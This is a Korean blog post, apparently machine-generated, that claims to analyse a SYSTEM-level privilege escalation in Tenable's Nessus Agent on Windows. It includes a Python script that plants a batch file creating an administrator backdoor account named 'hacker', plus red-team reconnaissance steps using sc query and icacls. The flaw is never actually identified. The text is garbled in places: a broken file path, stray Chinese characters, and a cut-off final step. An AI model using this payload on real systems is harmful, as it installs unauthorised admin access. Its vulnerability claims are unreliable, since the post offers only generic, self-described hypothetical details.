---
title: "Nessus Agent: Windows SYSTEM 권한 RCE 취약점 분석"
date: 2026-04-29T01:06:52+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

침투 테스트를 진행하는 도중, Windows 내부에서 흔히 발견되는 `Tenable Nessus Agent` 서비스를 마주친 적이 있습니까? 보안 팀의 신뢰를 받아 자체적으로 설치되는 이 에이전트는 시스템의 취약점을 스캔하여 보고하는 역할을 합니다. 하지만 아이러니하게도, 이 '보안의 눈' 자체가 해커에게 가장 달콤한 공격 경로가 되는 순간이 옵니다.

최근 공개된 Nessus Agent의 취약점은 단순한 버그가 아닙니다. 이는 공격자가 이미 내부망에 발을 들였다고 가정할 때(Lateral Movement 단계), 일반 사용자 권한(User)에서 시작하여 곧바로 시스템의 최고 권한인 SYSTEM을 탈취할 수 있는 '골든 티켓'과도 같습니다. 방화벽이 깨지고 모니터링 시스템이 무력화되는 상황을 상상해 보십시오. 이 글에서는 Nessus Agent가 어떻게 공격자의 권한 상승 도구로 전락하는지, 그 기술적 메커니즘과 실제 악용 시나리오를 깊이 있게 분석합니다. **(주의: 본 분석은 방어 목적의 교육 및 연구를 위한 것이며, 악의적인 사용은 엄격히 금지됩니다.)**

## 본론

### 기술적 배경 및 원리

Nessus Agent는 Windows 서비스(Service) 형태로 실행되며, 기본적으로 `Local System` 계정의 권한을 가지고 작동합니다. 이는 에이전트가 시스템 전반의 파일, 레지스트리, 프로세스 정보를 수집해야 하기 때문입니다.

문제는 에이전트가 **취약점 스캔 설정(Configuration)**이나 **업데이트 패키지(Update Package)**를 처리하는 과정에서 발생합니다. 일반적으로 에이전트는 중앙 서버(Nessus Scanner) 또는 로컬 파일 시스템의 특정 경로에서 명령이나 스크립트를 수신합니다. 이때, 수신되는 데이터의 무결성을 검증하는 과정(Verification)에 논리적 결함이 있거나, 파일 시스템의 권한(Access Control List) 설정이 느슨하면, 공격자가 이 경로에 악성 코드를 심거나 중간에서 데이터를 변조할 수 있습니다.

특히, 에이전트가 특정 디렉터리 내의 실행 파일이나 스크립트를 신뢰 관계(Trust Relationship) 없이 실행하는 경우, 공격자는 해당 경로에 악성 바이너리를 배포하여 SYSTEM 권한으로 코드 실행을 유도할 수 있습니다. 이는 전형적인 **DLL Search Order Hijacking**이나 **Unquoted Service Path** 취약점과 결합하여 더욱 치명적으로 작용할 수 있습니다.

### 공격 흐름도

다음 다이어그램은 공격자가 권한이 없는 상태에서 Nessus Agent의 취약점을 악용하여 SYSTEM 권한을 획득하는 과정을 시각화한 것입니다.

```javascript
graph LR
    A[Attacker Low Priv User] --> B[Reconnaissance]
    B --> C[Identify Nessus Agent Path]
    C --> D[Exploit Weak File Permissions]
    D --> E[Inject Malicious Payload]
    E --> F[Trigger Nessus Service or Link]
    F --> G[Service Runs as SYSTEM]
    G --> H[Payload Execution with SYSTEM]
    H --> I[Full System Compromise]
```

### 정상 작동 vs 취약점 악용 비교

아래 표는 Nessus Agent가 정상적으로 작동할 때의 데이터 처리 과정과, 취약점이 악용될 때의 프로세스를 비교한 것입니다.

| 구분 | 정상 작동 (Normal Operation) | 취약점 악용 (Exploitation) | | :--- | :--- | :--- | | **주체** | Tenable Nessus Server / Admin | 공격자 (Local User) | | **데이터 출처** | 신뢰할 수 있는 서버(Signed/Encrypted) | 변조된 로컬 파일 or 스푸핑된 패킷 | | **검증 프로세스** | 디지털 서명 및 무결성 검증 완료 | 검증 우회 또는 권한 설정 미흡으로 인한 우회 | | **실행 권한** | SYSTEM (Service Account) | SYSTEM (Service Account) | | **결과** | 정상 스캔 및 보고서 전송 | 악성 코드 실행 (Backdoor Installation) |

### PoC (Proof of Concept) 코드

다음은 학습 목적으로 작성된 Python 스크립트의 예시입니다. 이 시나리오는 Nessus Agent가 참조하는 설정 디렉터리에 쓰기 권한이 있는 경우, 악의적인 스크립트를 삽입하여 권한 상승을 시도하는 상황을 가정합니다.

```python
import os
import sys
import time

# ⚠️ Disclaimer: This code is for educational and authorized security testing only.
# Do not run this on systems without explicit permission.

def create_malicious_payload(target_dir):
    """
    Nessus Agent가 실행하거나 로드하는 예상 파일名으로 악성 스크립트 생성
    """
    payload_content = """
    @echo off
    :: Simulating malicious activity with SYSTEM privileges
    net user hacker P@ssw0rd123 /add
    net localgroup administrators hacker /add
    echo [+] Privilege Escalation Executed via Nessus Agent Service.
    """
    
    # 취약점 분석 시 발견된 취약한 경로 (가상의 예시)
    # 실제 공격에서는 에이전트가 읽는 config나 update 파일명을 타겟팅함
    target_file = os.path.join(target_dir, "update_check.bat")
    
    try:
        with open(target_file, "w") as f:
            f.write(payload_content)
        print(f"[+] Payload created at: {target_file}")
        return target_file
    except PermissionError:
        print("[-] Permission denied. Write access is required on the target directory.")
        sys.exit(1)

def wait_for_service_trigger(service_name):
    """
    Nessus Agent 서비스가 재시작되거나 스케줄링된 작업을 실행할 때까지 대기
    """
    print(f"[*] Waiting for service '{service_name}' to trigger the payload...")
    print("[*] In a real scenario, this might happen during the next scheduled scan.")
    # 실제 공격에서는 서비스를 재시작하거나 이벤트를 트리거하는 로직이 추가될 수 있음
    time.sleep(5)

if __name__ == "__main__":
    # Nessus Agent 기본 설치 경로 (Windows)
    # 공격자는 타겟 시스템에서 정확한 경로를 먼저 파악해야 함 (Recon 단계)
    nessus_path = r"C:\Program Files\Tenable\Nessus Agent
essus"
    
    if os.path.exists(nessus_path):
        print(f"[*] Target directory found: {nessus_path}")
        create_malicious_payload(nessus_path)
        wait_for_service_trigger("Tenable Nessus Agent")
    else:
        print("[-] Default path not found. Please verify installation path.")
```

이 코드는 단순히 계정을 생성하는 배치 파일을 작성하는 것이지만, 실제 공격에서는 리버스 쉘(Reverse Shell)을 생성하거나 크리더셜 덤프(Credential Dumping) 도구를 실행하는 코드로 대체될 수 있습니다.

### 침투 테스트 시나리오 가이드 (Step-by-Step)

실제 현장(Red Team)에서 발생할 수 있는 공격 시나리오를 단계별로 정리합니다.

1.  **정찰 (Reconnaissance)**     *   `sc query type= service state= all` 명령어를 통해 "Tenable Nessus Agent" 서비스가 존재하는지 확인합니다.     *   `icacls "C:\Program Files\Tenable\Nessus Agent"` 명령어로 설치 디렉터리 및 하위 폴더의 권한을 확인합니다. `BUILTIN\Users:(F)` 등의 쓰기 권한이 있거나, `Everyone` 권한이 열려 있다면 공격 가능성이 높습니다.

2.  **武器化 (Weaponization)**     *   확인된 취약 경로에 맞춰 공격 페이로드를 제작합니다. (예: DLL Hijacking을 위한 악성 DLL 생성)

3.  **전달 (Delivery)**     *   �

---

**출처**: [https://news.google.com/rss/articles/CBMid0FVX3lxTFBlLWRPZ3hackREeDBoQWtpejR1Y0hZbm95X1Y2VUJzOGQwTEp3OVhITThYbUpoanRYYUZEMjF1aGF1cnlNYW50T0g0NWo2RVdmQjN1OHBoU3RZcWRNaTF2MHV5U0JJUDRKb1FCYmhWTDZXZVZBRUN30gF8QVVfeXFMUHl6SUVER2FfYjJmVjd3ZnZ6b1V5dnJVNDluXzRzbE13TW9WTVJsWUwtYU1BMjk1NmNMYmduZzA4eGZFQUllMUZscmZGRjhBekhFNTM2Q3MzWnV2cnhscUk4eDRNY2hILTd4X2NyTnNSelVJOWpYekRKZFRmQg?oc=5](https://news.google.com/rss/articles/CBMid0FVX3lxTFBlLWRPZ3hackREeDBoQWtpejR1Y0hZbm95X1Y2VUJzOGQwTEp3OVhITThYbUpoanRYYUZEMjF1aGF1cnlNYW50T0g0NWo2RVdmQjN1OHBoU3RZcWRNaTF2MHV5U0JJUDRKb1FCYmhWTDZXZVZBRUN30gF8QVVfeXFMUHl6SUVER2FfYjJmVjd3ZnZ6b1V5dnJVNDluXzRzbE13TW9WTVJsWUwtYU1BMjk1NmNMYmduZzA4eGZFQUllMUZscmZGRjhBekhFNTM2Q3MzWnV2cnhscUk4eDRNY2hILTd4X2NyTnNSelVJOWpYekRKZFRmQg?oc=5)